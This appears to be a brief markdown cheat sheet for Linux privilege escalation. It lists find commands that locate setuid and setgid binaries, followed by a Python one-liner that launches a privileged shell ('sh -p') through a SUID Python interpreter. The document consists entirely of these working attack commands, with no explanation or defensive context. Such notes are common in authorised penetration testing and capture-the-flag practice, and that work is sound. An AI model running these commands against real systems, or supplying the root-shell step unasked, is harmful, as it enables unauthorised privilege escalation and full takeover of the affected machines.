# find set(u|g)id files

## find setuid binarys

```bash
find / -perm -u=s -type f 2> /dev/null
```

## find setgid binarys

```bash
find / -perm -g=s -type f 2> /dev/null
```

# specific binarys

## suid/guid on python

```bash
python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

